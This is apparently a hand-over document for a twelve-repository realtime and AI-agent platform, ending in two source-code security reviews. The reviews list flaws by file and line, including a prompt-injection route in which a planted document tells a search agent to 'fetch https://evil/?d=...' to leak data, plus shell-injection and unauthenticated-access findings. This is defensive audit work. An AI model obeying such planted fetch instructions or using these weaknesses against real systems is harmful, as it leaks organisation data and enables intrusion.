@@ -1,0 +1,328 @@
+# Next steps and recommendations
+
+Written 6 November 2026, right after the hand-over sweep that replaced the working notes in every repository with a plain README. This is the list of what is loose, what is owed, and what I would do next, in the order I would do it. Each item says where to look.
+
+The twelve repositories and how they depend on each other are described in [project-story.md](project-story.md). Section 7 is a security review of all twelve; read it before showing the stack to anyone outside, and fix the "first" list before deploying again. The short version: `distributed-core` is the only leaf, everything else stacks on it, and `aws-agentcore` (this repo) and `realtime-examples` sit on top and consume almost everything.
+
+## Where things stand
+
+| Repository | Default branch | State on 6 Nov 2026 |
+|---|---|---|
+| aws-agentcore | main | Clean, pushed. 181 commits in the last two weeks. |
+| ui-components | main | Pushed. The local checkout is 11 commits behind and has 139 uncommitted files (mostly `dist/`, nine under `src/components`). |
+| realtime-modules | main | Clean, pushed to both remotes (`origin` and `slalom`). |
+| service-runtime, pipeline-runtime, distributed-core, message-queue, platform-api, managed-nosql-store, live-video-streaming | main | Clean, pushed. |
+| event-catalog | main | Work is on `ui-components-2501`, 10 commits ahead of `main`. |
+| realtime-examples | main | Work is on `ui-components-2501`, 14 commits ahead of `main`. |
+
+The platform was last deployed to AWS on 26 and 27 October 2026 from a different machine. The credentials on this machine are not valid, so nothing here has been verified against the cloud since.
+
+## 1. Finish the sweep (this week)
+
+The sweep removed `docs/`, `CLAUDE.md`, `.claude/` and the skills folders. Some code still points at them.
+
+- **Twenty-five validator scripts and about fifteen helpers in `scripts/` reference the removed `docs/` tree.** They are the `validate-*.sh` judges, the `user-search-*` reports, `audit-ui-dom.cjs`, `social-documents.mjs`, `check-tenant-manifest.mjs`, `build.sh` and `portal-publish.mjs`. Run each once. Keep the ones that still pass (they only read `docs/` for journey logs or comments), fix the ones that merely need a path, and delete the ones that cannot work without the goal documents. Nothing in `package.json` calls them, so none of this blocks a build.
+- **Ten Playwright specs in `portal/e2e/` import `../../.claude/skills/ui-dom-audit/scripts/measure.mjs`, which no longer exists.** The same code lives in `ui-components/skills/ui-dom-audit`. Either copy `measure.mjs` into `portal/e2e/lib/` or install it from the library, then run `npm run audit:ui` in `portal/` to confirm.
+- **`tenants/manifest.json` has a comment pointing at `docs/deployment-enhancements/DE-29-tenant-manifest.md`.** Rewrite the comment so it explains the file on its own.
+- **Merge `ui-components-2501` into `main` in `realtime-examples` and `event-catalog`.** `main` has no commits the branch lacks, so both are fast-forwards. Until this is done, anyone cloning either repo lands on a stale default branch.
+- **Bring the local `ui-components` checkout up to date.** Pull `main`, then decide what to do with the 139 dirty files. The `dist/` changes are build output and can be dropped. The nine `src/components` edits need a look before they are committed or discarded.
+
+## 2. Make the repositories buildable by someone else (next two weeks)
+
+- **The portal vendors packed tarballs: 112 files, 227 MB in `portal/vendor/`.** Most are old `realtime-modules` builds (0.115.x with patches and provenance files). Keep only the two tarballs that `portal/package.json` and `middleware/package.json` pin today, delete the rest, and add a one-line README in the folder saying how to produce a new one.
+- **The two consumers pin different `realtime-modules` builds** (0.142.0 in the portal, 0.141.0 in the middleware) and the middleware reaches into `../portal/vendor` for its copy. Pin both to the same version and give the middleware its own `vendor/` entry, or publish the package to a registry and pin a version.
+- **Prefer tags over commit hashes for library pins.** `service-runtime` is pinned by a 40-character hash in `middleware/package.json`. That is exact, but it tells a reader nothing. Tag releases in each library and pin the tag.
+- **There is no continuous integration in `aws-agentcore`, `realtime-modules`, `service-runtime`, `pipeline-runtime`, `message-queue`, `event-catalog`, `platform-api` or `managed-nosql-store`.** Five of the twelve repos have GitHub workflows. Add a minimal one to each of the others that runs `npm test` and `npm run typecheck` on push. For this repo, run the middleware suite alone, as the README says, because two concurrent runs hang.
+- **Document the release order.** A change at the bottom of the stack ripples up through up to six repositories. Write the order down once (it is the layering in the story document) and the rule that each library change is one release, not several.
+
+## 3. Prove the cloud deployment again (when credentials are back)
+
+These were owed from the 26 and 27 October deployment and have not been done.
+
+- Rebuild and roll the middleware image, so the running service carries `realtime-modules` 0.140.0 or later. That release fixed the gateway race that showed up as a "parallel call" bug.
+- Run the cloud call smoke test with the seat settle delay set to zero.
+- Redeploy the devbox stack.
+- Run the page-thread migration. `infra/scripts/deploy.sh` refuses to deploy the middleware until it has run.
+- Apply the Aurora schema changes for the access tenant.
+
+## 4. Decisions that are still open
+
+These came up during October and were left for a person to decide. Each is small, but a default is currently standing in for an answer.
+
+- Program-owner scope on budgets and grants.
+- Who may edit SDLC policies.
+- Which roles see the guardrail editor.
+- Whether work-item comments require a steward check.
+- Deck save permissions, which currently differ by tenant.
+- The access tenant: lanes A0 through A2 are built; native Postgres contracts and the admin wizard's person picker are not.
+- Capacity: one 1-vCPU middleware task is CPU-bound at around 100 calls and 1,000 sockets. The options are a larger task size, a smaller advertised profile, or the Redis multi-node router.
+
+## 5. Product direction
+
+This is where the work was heading, in the order I would pursue it. Each item is also the last chapter of the story document.
+
+1. **Budgets on real spend.** Meter every Bedrock dollar (agents, devbox, queued jobs, the backend itself) and land it on a budget. Budgets apply to people as well as initiatives. The maintenance bots get a reserved floor funded first, and the remainder is what features compete for. The user-budget and maintenance-reserve rows are built; the real metering is not.
+2. **The microVM runner.** A Firecracker or container runtime that clones a repository, loads a skill with pre-built context, executes a feature, commits, and opens a pull request, charged against a budget. The devbox stack and the local-compute worker in `tools/` are the starting points.
+3. **Bots.** Cron-driven skills with budgets, built on `pipeline-runtime`.
+4. **Distillation.** Agents record what they did, inventory it, and load it as a skill for the next run. Designed, untested.
+5. **Hangouts to work items.** Meeting rooms shipped on 16 October but are barely tested. The path is recording, transcription, then a pipeline that turns the transcript into work items.
+
+Two things I would not spend time on: the Bedrock AgentCore retrieval and search agents from the original project, and anything that re-adds hand-rolled UI outside `ui-components`.
+
+## 6. For whoever picks this up
+
+- Start with the README in this repo, then [project-story.md](project-story.md), then `realtime-modules` and `ui-components`. Those three carry most of the product.
+- Run locally with `tilt up` or the two `npm run dev` commands in the README. No AWS access is needed for that.
+- Everything removed in the sweep is in git history. The last commit before the sweep in this repo is `5b6b828c`. The goal documents, validators' specifications and the fifty-five deployment-enhancement specs are all under `docs/` there.
+- Treat `ui-components` as the only place UI primitives live, and `realtime-modules` as the only place realtime hooks live. The whole stack depends on that rule holding.
+
+## 7. Security review (6 November 2026)
+
+This is a read-only review of the source of all twelve repositories, done in one pass. Every finding below was checked in code and cites a file and line. Nothing was exploited against a running system, so "confirmed" means confirmed in source. Items marked *unverified* were seen but not fully traced. Dependency counts come from `npm audit --omit=dev` on each lockfile.
+
+The pattern that produced most of the serious findings is the same everywhere: a hook, flag or secret that is **allowed by default when unset**. `NODE_ENV` not equal to `production`, an unset `MQ_SERVICE_AUTH_SECRET`, an unset `EVENT_CATALOG_AUTH_TOKEN`, `LOBBY_AUTHORITY_REQUIRED` off, an unsupplied `authz` hook, a queue with no access list, a cluster key that is never pinned. Each one opens the door on its own. The single most valuable change is to make every one of them fail closed and replace them with one explicit "insecure development mode" flag.
+
+### Fix first
+
+These are the findings an outsider could use today. In the order I would fix them:
+
+1. **platform-api: any signed-in user can run a shell command in the platform-api container.** The pipeline run trigger accepts a full definition in the body; an `agent` step defaults to the local runtime and passes its own tool list to `claude --tools`, spawned with the pod's environment (realtime secret, admin token, AWS credentials). `src/routes/pipelineTriggers.ts:322-338`, `src/handlers/AgentStepHandler.ts:257,314`, `ClaudeCodeAgentClient.ts:159-166,248`.
+2. **live-video-streaming: anyone with no login can listen to any call.** The legacy socket.io server allows every origin with no auth and `dashboard:subscribe` streams every room's producer ids; `/api/transports/consumer|connect|consume` have no auth, so a producer id is enough to receive the media. `src/websocket/index.js:24-29,80-98`, `src/handlers/api/index.js:512-515`, `src/api/transports/consume.js:6-41`.
+3. **aws-agentcore middleware: a tenant-scoped user admin can grant themselves the global `admin` role.** The role check accepts `*/admin` for any tenant and the scope check only rejects other tenants. `middleware/src/routes/identity.ts:175,183`, then `POST /api/session/role` at `lib/session.ts:271`.
+4. **distributed-core: cluster messages are verified against a public key carried inside the message itself.** Anyone who can reach a node port can sign with a fresh key and join the cluster or inject Raft entries. Gossip join is accepted unsigned, key pinning returns `true`, transports bind to `0.0.0.0`. `src/identity/KeyManager.ts:242-252,285`, `ClusterCommunication.ts:240`, `TCPAdapter.ts:61`.
+5. **aws-agentcore middleware: local-compute jobs run on other people's laptops.** Any `ManageDevbox` holder can queue a `local:*` job with no target node; any paired worker claims it and runs the prompt with `claude -p --dangerously-skip-permissions`. Separately, the pairing claim accepts a caller-chosen node id and rotates that node's token, so one user can take over another's machine. `routes/work.ts:50,233`, `providers/agent-jobs.ts:748`, `providers/local-compute.ts:231-235`, `tools/local-compute-worker.mjs:765-769`.
+6. **realtime-modules: document edits, calls and rooms are open by default.** `CRDTService` uses `authz || (() => true)` and never consults the router's channel check; document actions are authorised against `documentId` but run on `channel`; call signals other than invites broadcast to every socket in every tenant; document-call host powers trust a `userId` in the frame; rooms take identity from the frame and list every tenant's rooms. `src/server/CRDTService.ts:143,409,785`, `src/call/CallService.ts:295,2382,3348`, `src/room/RoomService.ts:196,243`.
+7. **platform-api: with `LOBBY_AUTHORITY_REQUIRED` off (the default), any Cognito user from any organisation can join `orgiq:initiative:<id>` and `assessment:team:<id>` calls.** `src/lib/lobbyAccess.ts:223-254`. Turn the flag on in every deployed environment and make the partition check mandatory.
+8. **message-queue and event-catalog ship with no authentication.** The queue's Helm chart sets neither `NODE_ENV` nor the auth secret and disables the network policy; its `/admin/acls` routes have no permission check and list every token; search and dead-letter reads skip the receive check. The catalog's admin API is unauthenticated when its token is unset, never checks GET requests, and its dead-letter replay re-publishes payloads signed as the catalog itself. `message-queue/helm/message-queue/templates/configmap.yaml:8-22`, `src/api/routes.ts:760-805`, `event-catalog/src/server/routes.ts:123-127`, `src/server/auth.ts:97-98`.
+9. **live-video-streaming: recordings, transcripts and webhooks are unauthenticated, and TURN is on the internet with committed credentials.** Recording and transcript downloads need no login; anyone can register a webhook for every event (a server-side request forgery channel) or delete platform-api's own; coturn is behind an internet-facing load balancer with `turnuser:turnpass` and no private-peer denial. `src/api/channels/index.js:1546-1649`, `src/api/event-subscriptions.js:17-40`, `k8s/base/coturn.yaml:14-23`.
+10. **Stored cross-site scripting in the shared text editor, in both libraries.** `SharedTextEditor` writes collaborator content to `innerHTML`. In realtime-examples the frontend keeps the Cognito refresh token in localStorage, so a script there takes over the account. `ui-components/src/components/collaboration/SharedTextEditor.tsx:35-38`, `realtime-modules/src/client/SharedTextEditor.tsx:50`, `realtime-examples/frontend/src/hooks/useAuth.ts:333`.
+11. **aws-agentcore search agent: prompt injection can leak organisation data.** One agent holds the graph and knowledge base and a browser that opens any URL in public network mode. A planted document only has to say "fetch https://evil/?d=...". `agents/search/main.py:304,443`, `infra/lib/agentcore-capabilities-stack.ts:106`.
+12. **pipeline-runtime: approvals are saved before they are authorised.** `approve()` writes the decision, then calls the authoriser; a restart reloads the saved approval and completes the gate. `src/durable/runner.ts:541-563`, `resume.ts:58-73`.
+
+### aws-agentcore
+
+Middleware:
+
+- **High** `POST /api/identity/users` is an upsert that overwrites any existing user's name, email and full grant set with no tenant check. Changing the email then lets the SSO email-link fallback take the account over. `routes/identity.ts:133-150`, `providers/identity.ts:522`, `routes/auth.ts:122`.
+- **High** `body-parser` 2.3.0 denial of service on compressed bodies, reachable before auth. `npm audit fix` resolves it. `src/index.ts:160`.
+- **Medium** `/api/lab` reads are open to a session from any tenant. `routes/lab.ts:45-46,133,184`.
+- **Medium** `PUT /api/identity/users/:id/person` relinks any user's person record in any tenant. `routes/identity.ts:212`.
+- **Medium** Plain `npm run dev` loads `.env.aws` (the real Aurora cluster), listens on `0.0.0.0`, and hands out a demo admin identity when Cognito is unset. `src/index.ts:688`, `lib/session.ts:434,460`.
+- **Medium** Shell injection on the worker through the job's `repo` field, which is pasted straight into a `git clone` shell command. Owner-only today; cross-user once combined with the job-targeting bug above. `routes/local-compute.ts:1249`, `tools/local-compute-worker.mjs:688,953`.
+- **Low** Ingest upload takes its S3 prefix from the `X-Prefix` header. `routes/ingest.ts:342`.
+- **Low** SSO links by email without checking `email_verified`; safe only while self sign-up is off. `lib/oidc.ts:118-124`.
+- **Low** Legacy static service-auth headers are still accepted because `SERVICE_AUTH_LEGACY_HEADERS` is never set to `refuse`. `lib/service-auth.ts:200-202,288-290`.
+- **Low** Every safeguard hinges on `NODE_ENV=production` and the Dockerfile's production stage does not set it. Without it the image uses the public dev realtime secret and the public session signing key. `lib/realtime-token.ts:41`, `lib/session.ts:249`.
+- **Low** No helmet, `x-powered-by` on. `src/index.ts:159-161`.
+- *Unverified:* the internal work-graph envelope signs only the body (30 s replay to sibling routes); whether an approved access-tenant request can provision `admin`; the devbox `SAFE_REF` check allows a leading `-` (`lib/devbox-git.ts:34`).
+
+Infrastructure and agents:
+
+- **Medium** The Aurora master credential goes to the middleware, seven agent runtimes (including graph-builder, which reads untrusted documents), the knowledge base and the legacy agents stack. Only search and advisor use the reader role. `infra/lib/agentcore-runtime-stack.ts:126,415`, `middleware-service-stack.ts:981`, `knowledge-base-stack.ts:290`.
+- **Medium** Callback secrets and the lab secret are passed as plaintext runtime environment variables through `--context`, so they sit in the CloudFormation template and the runtime config; `GetAgentRuntime` is granted on `*`. `agentcore-runtime-stack.ts:375,590-592`, `devbox-stack.ts:322`.
+- **Medium** The gateway role has `bedrock-agentcore:*` on `*`. `agentcore-gateway-stack.ts:164-165`.
+- **Medium** Without a certificate, CloudFront reaches the public ALB over plain HTTP, carrying cookies, the OAuth callback and the origin-verify secret. `portal-stack.ts:176`.
+- **Medium** Aurora, the documents bucket and the Cognito pool are `DESTROY` with deletion protection off and one-day backups; the deleter Lambda can delete any RDS cluster in the account. `aurora-stack.ts:118-120,200`, `foundation-stack.ts:65`, `authentication-stack.ts:69`.
+- **Low** Cognito: no MFA, admin password flow on, symbols not required, 30-day refresh tokens, localhost callbacks on every pool. Self sign-up is correctly off. `authentication-stack.ts:43-47,85,95`.
+- **Low** The SQL guard's deny list misses `query_to_xml(...)`, `pg_notify`, advisory locks, large-object functions, `dblink_exec` and huge `generate_series`. Contained by the reader role in production. `agents/_shared/sql_guard.py:83-97`.
+- **Low** graph-builder pastes raw document text into its prompt and writes the graph with the admin credential. `agents/graph-builder/main.py:332-336`.
+- **Low** The devbox image pipes a remote script into bash and installs an unpinned `claude-code`; base images have no digest; Python dependencies are floors, not pins (`requests>=2.31` is below two CVE fixes). `agents/devbox/Dockerfile:27-30`, `agents/base/Dockerfile:11,42`.
+- **Low** No security headers on CloudFront or the middleware. `portal-stack.ts:221-232`.
+- **Low** Service trust policies lack `aws:SourceAccount` and `aws:SourceArn` conditions. `agents-stack.ts:90`, `agentcore-runtime-stack.ts:273`, `devbox-stack.ts:174`.
+- **Low** *(unverified)* The reader role's password is sent as a cleartext `ALTER ROLE` while `pg_stat_statements` is preloaded. `schema/apply_all_seed.py:93`.
+- Dependencies: portal 11 high (lodash-es template injection via excalidraw, fast-uri, nanoid, source-map-js); infra 1 high, build-time only; middleware 1 critical (`proxy-addr`, not reachable since trust-proxy is a hop count) and 8 high (`body-parser`, `pptxgenjs` → `image-size`, OpenTelemetry Jaeger propagator pulled in by distributed-core, message-queue and realtime-modules with no fix yet).
+
+Checked and clean: mock endpoints return 404 outside mock mode; the realtime token pins HS256 and checks issuer, audience and expiry; cookies are httpOnly with SameSite; an Origin allowlist runs on HTTP and websocket upgrades; login, claim and masquerade are rate limited; JSON bodies cap at 100 KB; Cedar fails closed in production; search results are tenant filtered; all SQL interpolations are constants or clamped numbers; the public web fetch blocks private addresses and re-checks redirects; S3 buckets block public access and are encrypted; the portal uses origin access control; IMDSv2 is required; ECS secrets come from Secrets Manager; the portal has no raw HTML rendering of user content and keeps no tokens in localStorage.
+
+### realtime-modules
+
+- **High** Document authorisation defaults open and skips the router (see "fix first" 6). `src/server/CRDTService.ts:143,785`, `attach.ts:532`.
+- **High** Document actions authorised against one document, run on another. `CRDTService.ts:409`.
+- **High** Untargeted call invites and all non-invite call signals broadcast to every tenant; `callerName` is client supplied. `src/call/CallService.ts:295,2382`.
+- **High** Document-call host powers trust `payload.userId`. `CallService.ts:3348`.
+- **High** Rooms: no channel check, frame identity, cross-tenant index. `src/room/RoomService.ts:196,243`, `attach.ts:454`.
+- **High** `SharedTextEditor` stored XSS. `src/client/SharedTextEditor.tsx:50`.
+- **Medium** DM membership is enforced only for `chat:dm:`; `<tenant>:dm:` lobbies and `chat:dmg:` groups are open, and call `status` reveals participants for any lobby. `src/chat/dmChannels.ts:29,50`, `ChatService.ts:2303`, `CallService.ts:2548`.
+- **Medium** Rate limiting is opt-in and off in `attachRealtime`; default `maxPayload` is 16 MiB; no caps on queue depth or channels per socket. `src/server-ws/createWsHandler.ts:70,111`.
+- Dependencies: 1 critical (`proxy-addr`, same caveat), 2 high (`body-parser` 1.20.5, `js-yaml`) through service-runtime's express 4.
+
+### realtime-examples (the websocket gateway)
+
+- **High** `activity:broadcast` is one channel shared by every tenant, auto-subscribed on connect, with unbounded history. `src/realtime-fanout/raw-channel-guards.ts:53`.
+- **Medium** `SKIP_AUTH` is only refused when `NODE_ENV=production`; the Helm defaults ship `NODE_ENV: development` with `SKIP_AUTH: "true"`, the EKS values file runs that on a real cluster, and the Fargate task never sets `NODE_ENV`. Under `SKIP_AUTH`, `?userId=` impersonates anyone with admin. `src/server.ts:577-589`, `k8s/helm/realtime-examples/values.yaml:20,35`, `values-eks-shape2.yaml:57-59`, `lib/task-definition.ts:61`.
+- **Medium** JWT verification pins RS256 and issuer but not audience, client id or `token_use`; admin comes from a raw `isAdmin` claim. `src/middleware/auth-middleware.ts:263,285`.
+- **Medium** The org gate for org-less tokens only logs unless `WSG_ORG_GATE_ENFORCE=true`, which nothing sets; `room:*`, `chat:dm*` and `<tenant>:*` channels get no tenant check. `src/middleware/authz-middleware.ts:107`.
+- **Medium** 8 MiB frames are parsed before any size or rate check; the pre-session queue caps frames, not bytes. `src/server.ts:2939`, `src/core/message-router.ts:1104,1168`.
+- **Medium** *(unverified)* Print and export build HTML from document markdown without escaping, in a same-origin window. `frontend/src/components/doc-editor/useDocumentActions.ts:570`.
+- **Low** CDK defaults: Redis with no password or TLS; the public load balancer falls back to plain HTTP without a certificate, so bearer tokens travel over `ws://`. `lib/redis-service.ts:60`, `lib/fargate-service.ts:153`.
+- **Low** `ALLOWED_ORIGINS` defaults to `*` and is never enforced on the upgrade; the per-IP connection limit uses `socket.remoteAddress`, so behind an ALB one client can exhaust the limit for everyone. `src/server.ts:503,524,3009`.
+- Dependencies: root 64 high, mostly CDK v1 packages listed as runtime dependencies (`package.json:40-49`) and `aws-cdk-lib` below 2.260; moving them to devDependencies removes most. `src/` 7 high, all transitive through distributed-core.
+
+### service-runtime
+
+- **High** The raw-HTTP gate signs only the body, not method, path or audience, so a captured header replays against any other endpoint or service sharing the secret for 300 s. The audience-bound `verifyServiceRequest` exists but is unused here. `src/auth/require-service-auth-raw-http.ts:183-188`, `src/http-service-auth.ts:30`.
+- **Medium** No secret plus `NODE_ENV` not `production` means allow everything; message-queue copies the rule. `require-service-auth-raw-http.ts:139-155`.
+- **Medium** The body is read fully into memory with no cap before verification. `require-service-auth-raw-http.ts:74-81,172`.
+- **Low** No nonce; the 401 body says why it failed, which lets a caller probe the allowlist; no minimum secret length. The HMAC itself is sound, with constant-time comparison and key rotation.
+
+### distributed-core
+
+- **Critical** Signature verified against the sender's own key; `signedAt` excluded from the signed bytes (see "fix first" 4). `src/identity/KeyManager.ts:242-252`.
+- **High** Unsigned gossip accepted; pinning always passes; transports bind `0.0.0.0`; mutual TLS optional. `ClusterCommunication.ts:240`, `KeyManager.ts:285`, `TCPAdapter.ts:61,96`.
+- **High** The pipeline `webhook` action fetches any URL in the definition with no host checks (server-side request forgery, including the instance metadata address) and returns the body into the run; `hmacSecret` sits inline in definitions saved on every run record. `src/applications/pipeline/PipelineExecutor.ts:2966-3025`.
+- **Low** Outgoing webhook signatures cover only the body, no timestamp. `src/common/webhook-signature.ts:76-97`.
+- Dependencies: `ws` 8.x advisories affect the peer transport directly; `js-yaml` high. Both have fixes. Because every other repo depends on this one, bumping here clears a transitive high everywhere.
+
+### message-queue
+
+- **High** Helm deploys with no auth (see "fix first" 8). `helm/message-queue/templates/configmap.yaml:8-22`, `values.yaml:155`. docker-compose does set `NODE_ENV=production`.
+- **High** `/admin/acls` unprotected and lists tokens; search and dead-letter reads skip the receive check; queues with no access list allow everyone; tokens logged in plain text. `src/api/routes.ts:353,611,760-805`, `src/api/authMiddleware.ts:32,72-75,87`.
+- **Low** The runtime image is non-root with no baked secrets, but still ships git, openssh, python3, make and g++. `Dockerfile:58-60`.
+- Dependencies: 1 critical (`proxy-addr`, not triggerable), 9 high (OpenTelemetry Jaeger propagator with no fix, `body-parser`, `fast-uri`, `systeminformation`, `brace-expansion`, `js-yaml`).
+
+### event-catalog
+
+- **High** Admin API unauthenticated by default; GET never checked even with auth on, so dead-letter payloads are readable; replay re-publishes as the catalog (see "fix first" 8). `src/server/auth.ts:54,97-98`, `src/server/routes.ts:123-127`, `routes/dlq.ts:219,259`.
+- **Low** The validating publisher defaults to `warn`, so invalid payloads are published anyway. `src/utils/validating-publisher.ts:81`. Whether replay re-validates is unverified.
+- Dependencies: 6 high, all transitive through message-queue and distributed-core.
+
+### pipeline-runtime
+
+- **High** Approval persisted before authorisation; resume trusts saved approvals; approver defaults to `local` (see "fix first" 12). `src/durable/runner.ts:541-563`, `resume.ts:58-73`.
+- Step code never runs through `eval`, `vm` or child processes; only host-registered handlers and distributed-core's built-in nodes execute. The webhook action above is the main thing a definition can do. Dependencies: clean.
+
+### platform-api
+
+- **Critical** Shell execution through pipeline agent steps (see "fix first" 1).
+- **High** Lobby admission fail-open by default (see "fix first" 7).
+- **Medium** Cognito tokens checked only for issuer and RS256: no client id, no `token_use`; tenant comes from `custom:orgId`. Whether app clients can write that attribute is unverified. `src/middleware/auth.ts:141-145`.
+- **Low** CORS echoes any Origin with credentials; the `SKIP_AUTH` guard depends on `NODE_ENV=production`, which the image never sets. `src/app.ts:53-56`, `src/middleware/auth.ts:108-115`.
+- The lobby-authority call forwards the user's bearer token to whatever `LOBBY_AUTHORITY_URL` says, and the documented example is plain `http://`. `docs/lobby-authority.md:75`.
+- Dependencies: 1 critical (`proxy-addr`), 13 high (`multer`, `sharp`/libvips, `body-parser`, `js-yaml`, all with fixes).
+
+### live-video-streaming
+
+- **Critical** Unauthenticated eavesdropping (see "fix first" 2).
+- **High** `/api/sessions` hands a publisher token for any session to any Cognito user under a body-supplied `userId`, bypassing platform-api's lobby checks because the ingress routes `/` to the SFU; `/:id/end` with `hard` ends anyone's call. `src/api/sessions/index.js:86-104,221,252-283,402`.
+- **High** Recordings and transcripts downloadable without login, `Access-Control-Allow-Origin: *`, public cache; an SSE stream of recording events across all channels. `src/api/channels/index.js:1546-1649`.
+- **High** Event-subscription router unauthenticated. `src/api/event-subscriptions.js:17-40`, `src/handlers/api/index.js:344`.
+- **High** coturn internet-facing with committed `turnuser:turnpass` and no `denied-peer-ip`. `k8s/base/coturn.yaml:14-23`, `k8s/overlays/ec2/coturn-loadbalancer-patch.yaml:93`, `k8s/base/sfu.yaml:141-146`. The Helm chart's default TURN password is `webrtc123` (`helm/live-video-broadcaster/values.yaml:48`).
+- **Medium** The mediasoup DTLS private key is committed and inherited by the EC2 overlay; `ADMIN_TOKEN` is accepted as an all-rooms stage token and HS256 tokens are accepted with no audience or issuer by default; dev scripts use `ADMIN_TOKEN=admin`. `k8s/base/dtls-cert.yaml:17`, `src/middleware/bearerAuth.js:65-95`, `package.json:11`.
+- **Low** A corporate proxy CA certificate (`proxy-ca.pem`, committed 4 May 2026) is baked into the production image as a system trust root. `Dockerfile:9,38`.
+- Dependencies: 2 critical (`proxy-addr`; `tar`, denial of service only), 14 high. The socket.io, engine.io and `ws` denial-of-service advisories are reachable by anyone because socket.io accepts unauthenticated connections. mediasoup 3.20.5 is clean.
+
+### managed-nosql-store
+
+- **Medium** No authentication at all: it never checks SigV4 and accepts any request. Binds `0.0.0.0` by default and the example compose file publishes port 8000 on every interface; membership-change and snapshot admin endpoints are open when `MNS_ADMIN_TOKEN` is unset; `/replication/inbound` never checks auth; Raft between nodes is plaintext TCP with no auth by default. The README does say "private network only". `src/main.ts:61`, `docker-compose.example.yml:14`, `src/cluster/raft/RaftClusterServer.ts:519-521,661,673-690,911-925`, `RaftNetworkTransport.ts:90-99`. Body limits and table-name validation are fine.
+- Dependencies: 8 high, transitive.
+
+### ui-components
+
+- **High** `SharedTextEditor` writes collaborator content to `innerHTML`; used by `PanelsView`. `src/components/collaboration/SharedTextEditor.tsx:35-38`, `src/components/misc/PanelsView.tsx:112`.
+- **High** The installed `@tiptap/core` 3.30.2 (GHSA-cp6q-959q-f8rh, `__proto__` key becomes DOM attributes) and `prosemirror-view` 1.42.2 (GHSA-c8x8-7fp4-3x9w, XSS on paste) are vulnerable, and the `^3.0.0` peer range lets every consumer install them. `package.json:173`.
+- **Medium** The email template preview renders saved `htmlBody` with `dangerouslySetInnerHTML` in the admin app (admin-to-admin XSS). `src/components/identity/admin/EmailTemplateFormPage.tsx:42,127-130`.
+- Checked and clean: react-markdown link handling, React 19 blocking `javascript:` hrefs, CodeBlock escaping, no cross-window message listeners, and the `skills/ui-dom-audit` scripts fetch nothing remote and pass nothing to a shell.
+
+### Cross-cutting recommendations
+
+1. **One insecure-dev flag, fail closed everywhere else.** Replace every "allowed when unset" check listed above with a startup assertion that fails when a secret, hook or policy URL is missing outside an explicit `INSECURE_DEV=1`. Set `ENV NODE_ENV=production` in every runtime Dockerfile (middleware, platform-api, realtime-examples, LVS) so the images are safe even when the orchestrator forgets.
+2. **Make realtime-modules refuse to start without its hooks.** Router `authorize`, document `authz`, `lobbyGuard`, upload `authz` and room identity should all be required. Add one test per module that a socket in tenant A receives zero frames from tenant B, and stamp server identity on every frame (room and upload display names, awareness, pin authors).
+3. **Give distributed-core a real cluster identity.** A cluster CA or a fixed list of member public keys, checked on every gossip, Raft and replication message; sign `signedAt` and reject stale messages; default bind to `127.0.0.1`; make mutual TLS the production default.
+4. **Bind service-to-service signatures to method, path and audience.** Move every caller onto `verifyServiceRequest`, add a nonce cache for mutating routes, cap the body read, return a generic 401, and set `SERVICE_AUTH_LEGACY_HEADERS=refuse` once all callers sign.
+5. **Write one "who may grant what" rule** and use it from identity routes, access-tenant provisioning and the seeds. `admin` is assignable only by `admin`; nobody edits their own grants; user create is not an upsert.
+6. **Treat local compute and devbox as code execution on someone's machine.** Bind every job to a node the caller owns, refuse untargeted `local:*` jobs, validate `repo` against a strict pattern and use `execFileSync`, drop `--dangerously-skip-permissions` for an explicit settings allowlist, and never clear `revoked_at` on a pairing conflict.
+7. **Agent design rule: private data, untrusted content and outbound network never in one agent.** Take `fetch_web_page` away from agents that hold the graph or knowledge base, or give it a domain allowlist with no query strings. Wrap document text in tagged delimiters in graph-builder and verify extracted entities appear in the source. User-written pipeline definitions get no tools; tool-using agent steps run only on the devbox runtime with a minimal environment.
+8. **Make LVS service-side only.** Browsers get media tokens from platform-api, never from the SFU. Delete the legacy `/rooms`, `/streams`, `/transports` routes and the socket.io signalling. Put recordings, event subscriptions and the stats endpoints behind tokens scoped to a room.
+9. **Rotate and remove every committed credential**: the coturn user and password, the DTLS key, `turn-secret.yaml`, `ADMIN_TOKEN=admin`, `webrtc123`, the dev realtime secret and session key. Pass secrets by ARN and fetch at start instead of through `--context`. Add a CI check that fails on base64-encoded private keys.
+10. **Least privilege in AWS.** A scoped application database role per service with the master secret reserved for migrations; replace `bedrock-agentcore:*` on `*` and `GetAgentRuntime` on `*` with named actions on named ARNs; add `aws:SourceAccount` conditions to every service trust policy; scope the deleter Lambda to this cluster; turn on deletion protection and RETAIN before real data arrives; put cdk-nag in CI. Consider a dedicated AWS account: the wildcard grants currently reach other projects in the shared account.
+11. **Dependency hygiene.** Bump `ws` and `js-yaml` in distributed-core first (it clears a transitive high in six repos), then `body-parser`, `fast-uri`, `systeminformation` and the OpenTelemetry pins in message-queue; `npm audit fix` in middleware, platform-api and LVS; raise ui-components' tiptap and prosemirror peer floors; move realtime-examples' CDK packages to devDependencies; lock Python dependencies and run pip-audit. Then gate CI on `npm audit --omit=dev` highs.
+12. **Transport and headers.** Refuse to synth a public HTTP-only listener in both CDK packages; require `https` for the lobby-authority URL; add helmet or a CloudFront response-headers policy with CSP, HSTS and `frame-ancestors`; take the client IP from the load balancer header for rate limits and move them to the ALB or WAF; enforce the Origin allowlist on websocket upgrades; sanitise `SharedTextEditor` with DOMPurify or replace it with the Tiptap editor.
+
+## 8. Second security pass and the fix work list (7 November 2026)
+
+A second read-only pass over the ground the first one did not reach: the middleware's money and authority routes, git history and every deployment manifest, the agents and AgentCore gateway tools, the browser clients, and the library modules the first pass skipped. Same rules as section 7: confirmed in source, cited by file and line, nothing exploited, *unverified* where not fully traced.
+
+### What the second pass settled from section 7
+
+- **Access-tenant provisioning cannot grant `admin`.** Roles come only from the catalog, admin is filtered out, and the configuration route edits only duration and sensitivity. `routes/access.ts:143,477`, `providers/access.ts:291`. Closed.
+- **The internal work-graph envelope** signs only the body, but each route has its own service id and a 30 second window, so a replay works only against a sibling route with the same payload shape. Low. `routes/internal-work-graph-compute.ts:38-44`.
+- **The devbox branch regex allows a leading dash** and the entrypoint runs `git checkout -B <branch>` as argv, so a dash-prefixed branch would be read as an option. Branches are server-supplied today. Low. `lib/devbox-git.ts:57`, `agents/devbox/main.py:412,463-466`.
+- **Sockets are never closed when their token expires.** Confirmed: the connect path verifies once and only a heartbeat follows. `realtime-modules/src/server-ws/createWsHandler.ts:236-300`.
+- **Bedrock memory actor ids** are no longer a concern: no agent uses the memory client, and the stacks namespace by actor per tenant.
